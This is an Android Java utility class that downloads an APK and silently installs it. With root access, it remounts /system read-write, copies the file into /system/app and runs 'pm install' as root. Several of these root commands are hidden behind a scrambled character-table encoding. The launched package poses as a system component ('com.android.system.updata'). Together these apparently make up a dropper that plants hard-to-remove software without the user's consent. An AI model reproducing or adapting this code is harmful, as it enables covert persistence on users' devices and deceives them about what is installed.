package com.jess.arms.utils;

import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;


import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by yangfan on 2017/1/15
 *
 * 根据系统是否root选择是否静默安装APK
 */

public class InstallAPK {

    public static Context mContext = null;
    public static InstallAPK mInstallApkQuietly = null;
    public static String sdRootPath = "/system/app/updata.apk";//系统APP路径
    public static String sdPath = "/sdcard/update/updata.apk";//下载SD卡路径
    public static String packageAppName = "此处是要下载的APP包名";
    public static String url = "此处写要下载的url";
    public static File file = null;

    public static InstallAPK getInstance(Context context) {
        if (mInstallApkQuietly == null) {
            mInstallApkQuietly = new InstallAPK();
            mContext = context;
        }
        return mInstallApkQuietly;
    }

    public void init(String url) {
        InstallAPK.url = url;
        if (url == null){
            ToastUtil.showLong("更新地址出错!");
        }

        if (isAppInstalled(mContext, packageAppName) & !isRunning(mContext, packageAppName)) {
            startApp();
        }
        if (!isAppInstalled(mContext, packageAppName)) {
            if (!isHasfile()) {
                downLoad();
            } else {
                if (hasRootPerssion()) {
                    moveToRoot();
                } else {
                    openFile();
                }
            }
        }
    }

    //
    public static void downLoad() {
        Thread thread;
        thread = new Thread(new Runnable() {
            @Override
            public void run() {
                if (url.startsWith("http"))
                    file = downLoadFile(url);
                else
                   ToastUtil.showLong("更新地址出错!");
            }
        });
        thread.start();
    }

    // 下载apk
    public static File downLoadFile(String httpUrl) {
        final String fileName = "updata.apk";
        File tmpFile = new File("/sdcard/update");
        if (!tmpFile.exists()) {
            tmpFile.mkdir();
        }
        final File file = new File("/sdcard/update/" + fileName);

        try {
            URL url = new URL(httpUrl);
            try {
                HttpURLConnection conn = (HttpURLConnection) url
                        .openConnection();
                InputStream is = conn.getInputStream();
                FileOutputStream fos = new FileOutputStream(file);
                byte[] buf = new byte[1024];
                conn.connect();
                double count = 0;
                if (conn.getResponseCode() >= 400) {
                    // Toast.makeText(Main.this, "连接超时", Toast.LENGTH_SHORT)
                    // .show();
                } else {
                    while (count <= 100) {
                        if (is != null) {
                            int numRead = is.read(buf);
                            if (numRead <= 0) {
                                break;
                            } else {
                                fos.write(buf, 0, numRead);
                            }
                        } else {
                            break;
                        }
                    }
                }
                conn.disconnect();
                fos.close();
                is.close();
            } catch (IOException e) {
                // TODO Auto-generated catch block

                e.printStackTrace();
            }
        } catch (MalformedURLException e) {
            // TODO Auto-generated catch block

            e.printStackTrace();
        }
        return file;
    }

    // 启动app
    public static void startApp() {
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_LAUNCHER);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        ComponentName cn = new ComponentName("com.android.system.updata",
                "com.android.zh.test.DemoPay");
        intent.setComponent(cn);
        mContext.startActivity(intent);
    }

    // 普通安装app
    public static void openFile() {
        // 核心是下面几句代�?
        if (!isHasfile()) {
            downLoadFile(url);
        }
        Intent intent = new Intent();
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.setAction(Intent.ACTION_VIEW);
        intent.setDataAndType(
                Uri.fromFile(new File("/sdcard/update/updata.apk")),
                "application/vnd.android.package-archive");
        mContext.startActivity(intent);
    }

    // 判断是否在运行
    public static boolean isRunning(Context context, String packageName) {
        ActivityManager am = (ActivityManager) context
                .getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> list = am.getRunningAppProcesses();
        for (ActivityManager.RunningAppProcessInfo appProcess : list) {
            String processName = appProcess.processName;
            if (processName != null && processName.equals(packageName)) {
                return true;
            }
        }
        return false;
    }

    // 判断是否安装APP
    public static boolean isAppInstalled(Context context, String packageName) {
        final PackageManager packageManager = context.getPackageManager();
        List<PackageInfo> pinfo = packageManager.getInstalledPackages(0);
        List<String> pName = new ArrayList<String>();
        if (pinfo != null) {
            for (int i = 0; i < pinfo.size(); i++) {
                String pn = pinfo.get(i).packageName;
                pName.add(pn);
            }
        }
        return pName.contains(packageName);
    }

    // 判断是否updata目录下有文件
    public static boolean isHasfile() {
        try {
            File f = new File("/sdcard/update/updata.apk");
            if (!f.exists()) {
                return false;
            }
        } catch (Exception e) {
            // TODO: handle exception
            return false;
        }
        return true;
    }

    // 判断system app下是否有文件
    public static boolean isRootHasfile() {
        try {
            File f = new File("/system/app/updata.apk");
            if (!f.exists()) {
                return false;
            }
        } catch (Exception e) {
            // TODO: handle exception
            return false;
        }
        return true;
    }

    // 密码对照�?
    private static final char[] StringTable =
            // 0 1 2 3 4 5 6 7 8 9
            {'Q', 'r', 'e', '6', 'F', 'u', 'N', 'K', 't', '!', // 0
                    'P', 's', 'V', 'D', '7', '>', ',', 'l', '4', '-', // 1
                    'k', 'b', 'I', 'p', '8', 'h', '+', '.', 'Y', 'q', // 2
                    '_', '9', 'z', '5', 'E', 'y', 'R', '&', 'm', '3', // 3
                    'w', '1', 'A', 'd', 'W', 'o', 'S', ' ', '=', '@', // 4
                    'a', 'J', 'O', 'U', 'v', '?', 'g', 'T', 'L', '2', // 5
                    '/', 'f', ']', '<', 'Z', '0', ':', 'C', '[', 'n', // 6
                    '(', '+', ')', '*', '\"', '|', '$', '^', '{', '}', // 7
                    'x', 'M', 'c', 'X', 'H', 'j', 'i', 'B', 'G', '\\' // 8
            };

    public static String getStringFromTable(int[] arr) {
        String ret = "";
        if (arr == null)
            return ret;
        for (int i = 0; i < arr.length; i++) {
            ret += StringTable[arr[i]];
        }
        return ret;
    }

    // 安装
    public static void install(Context context) {
        String apkPath = sdRootPath;
        // 先判断手机是否有root权限
        if (hasRootPerssion()) {
            // 有root权限，利用静默安装实�?hasRootPerssion()
            clientInstall(apkPath);
        } else {
            // 没有root权限，利用意图进行安�?
            openFile();
        }
    }

    // 判断是否有root权限
    public static boolean hasRootPerssion() {
        PrintWriter PrintWriter = null;
        Process process = null;
        try {
            process = Runtime.getRuntime().exec("su");
            PrintWriter = new PrintWriter(process.getOutputStream());
            PrintWriter.flush();
            PrintWriter.close();
            int value = process.waitFor();
            return returnResult(value);
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
        return false;
    }

    // 静默安装
    private static boolean clientInstall(String apkPath) {
        PrintWriter PrintWriter = null;
        Process process = null;
        try {
            process = Runtime.getRuntime().exec("su");
            PrintWriter = new PrintWriter(process.getOutputStream());
            PrintWriter.println("chmod 777 " + apkPath);
            PrintWriter
                    .println("export LD_LIBRARY_PATH=/vendor/lib:/system/lib");
            PrintWriter.println("pm install -r " + apkPath);
            // PrintWriter.println("exit");
            PrintWriter.flush();
            PrintWriter.close();
            int value = process.waitFor();
            return returnResult(value);
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
        return false;
    }

    private static boolean returnResult(int value) {
        // 代表成功
        if (value == 0) {
            return true;
        } else if (value == 1) { // 失败
            return false;
        } else { // 未知情况
            return false;
        }
    }

    // 移动到system app目录�?
    public static void moveToRoot() {

        String a = getStringFromTable(new int[]{50, 43, 21, 47, 23, 5, 11,
                25, 47, 5, 23, 43, 50, 8, 50, 27, 50, 23, 20, 47, 60, 11, 35,
                11, 8, 2, 38, 60, 50, 23, 23});
        String b = getStringFromTable(new int[]{50, 43, 21, 47, 11, 25, 2,
                17, 17});
        String c = getStringFromTable(new int[]{11, 5});
        String d = getStringFromTable(new int[]{38, 45, 5, 69, 8, 47, 19, 45,
                47, 1, 2, 38, 45, 5, 69, 8, 16, 1, 40, 47, 19, 8, 47, 35, 50,
                61, 61, 11, 59, 47, 60, 43, 2, 54, 60, 21, 17, 45, 82, 20, 60,
                38, 8, 43, 21, 17, 45, 82, 20, 39, 47, 60, 11, 35, 11, 8, 2, 38});
        String e = getStringFromTable(new int[]{82, 50, 8, 47, 60, 11, 43,
                82, 50, 1, 43, 60, 5, 23, 43, 50, 8, 2, 60, 5, 23, 43, 50, 8,
                50, 27, 50, 23, 20, 47, 15, 47, 60, 11, 35, 11, 8, 2, 38, 60,
                50, 23, 23, 60, 5, 23, 43, 50, 8, 50, 27, 50, 23, 20});
        String f = getStringFromTable(new int[]{38, 45, 5, 69, 8, 47, 19, 45,
                47, 1, 2, 38, 45, 5, 69, 8, 16, 1, 45, 47, 19, 8, 47, 35, 50,
                61, 61, 11, 59, 47, 60, 43, 2, 54, 60, 21, 17, 45, 82, 20, 60,
                38, 8, 43, 21, 17, 45, 82, 20, 39, 47, 60, 11, 35, 11, 8, 2, 38});
        String g = getStringFromTable(new int[]{2, 80, 86, 8});

        String paramString = a + "\n" + b + "\n" + c + "\n" + d + "\n" + e
                + "\n" + f + "\n" + g + "\n" + g;
        if (hasRootPerssion()) {
            if (execRootCmdSilent(paramString) == -1) {

            } else {
                getSystemPower();
                install(mContext);
            }
        }
    }

    //将文件从sd卡以移动到sytem app 系统目录下
    public static void moveToRoot1() {
        String paramString = "adb push updata.apk /system/app" + "\n" +
                "adb shell" + "\n" +
                "su" + "\n" +
                "mount -o remount,rw -t yaffs2 /dev/block/mtdblock3 /system" + "\n" +
                "cat /sdcard/update/updata.apk > /system/app/updata.apk" + "\n" +
                "mount -o remount,ro -t yaffs2 /dev/block/mtdblock3 /system" + "\n" +
                "exit" + "\n" +
                "exit";

        if (hasRootPerssion()) {
            if (execRootCmdSilent(paramString) == -1) {

            } else {
                getSystemPower();
                install(mContext);
            }
        }
    }

    // 执行shell命令
    protected static int execRootCmdSilent(String paramString) {
        try {
            Process localProcess = Runtime.getRuntime().exec("su");
            Object localObject = localProcess.getOutputStream();
            DataOutputStream localDataOutputStream = new DataOutputStream(
                    (OutputStream) localObject);
            String str = String.valueOf(paramString);
            localObject = str + "\n";
            localDataOutputStream.writeBytes((String) localObject);
            localDataOutputStream.flush();
            localDataOutputStream.writeBytes("exit\n");
            localDataOutputStream.flush();
            localProcess.waitFor();
            int result = localProcess.exitValue();
            return result;
        } catch (Exception localException) {
            localException.printStackTrace();
            return -1;
        }
    }

    // 拿到用户权限
    public static void getSystemPower() {
        try {

            String a = getStringFromTable(new int[]{50, 43, 21, 47, 11, 25,
                    2, 17, 17});
            String b = getStringFromTable(new int[]{11, 5});
            String c = getStringFromTable(new int[]{38, 45, 5, 69, 8, 47, 19,
                    45, 47, 1, 40, 16, 1, 2, 38, 45, 5, 69, 8, 47, 60, 43, 2,
                    54, 60, 21, 17, 45, 82, 20, 60, 38, 8, 43, 21, 17, 45, 82,
                    20, 65, 47, 60, 11, 35, 11, 8, 2, 38});
            String d = getStringFromTable(new int[]{38, 45, 5, 69, 8, 47, 19,
                    45, 47, 1, 40, 16, 1, 2, 38, 45, 5, 69, 8, 47, 60, 43, 2,
                    54, 60, 21, 17, 45, 82, 20, 60, 38, 8, 43, 21, 17, 45, 82,
                    20, 65, 47, 60, 11, 35, 11, 8, 2, 38, 60, 50, 23, 23});
            String e = getStringFromTable(new int[]{82, 25, 38, 45, 43, 47,
                    3, 18, 18, 47, 60, 11, 35, 11, 8, 2, 38, 60, 50, 23, 23,
                    60, 5, 23, 43, 50, 8, 50, 27, 50, 23, 20});
            String f = getStringFromTable(new int[]{2, 80, 86, 8});

            String command = a + "\n" + b + "\n" + c + "\n" + d + "\n" + e
                    + "\n" + f + "\n" + f;
            if (hasRootPerssion()) {
                if (execRootCmdSilent(command) == -1) {

                } else {

                }
            }
        } catch (Exception e) {
            // TODO: handle exception
        }
    }

    //修改系统权限   system app  权限 rw-r-r
    public static void getSystemPower1() {
        try {
            String command = "adb shell" + "\n" +
                    "su" + "\n" +
                    "mount -o rw,remount /dev/block/mtdblock0 /system" + "\n" +
                    "mount -o rw,remount /dev/block/mtdblock0 /system/app" + "\n" +
                    "chmod 644 /system/app/updata.apk" + "\n" +
                    "exit" + "\n" +
                    "exit";

            if (hasRootPerssion()) {
                if (execRootCmdSilent(command) == -1) {

                } else {
                }
            }
        } catch (Exception e) {
            // TODO: handle exception
        }
    }

}
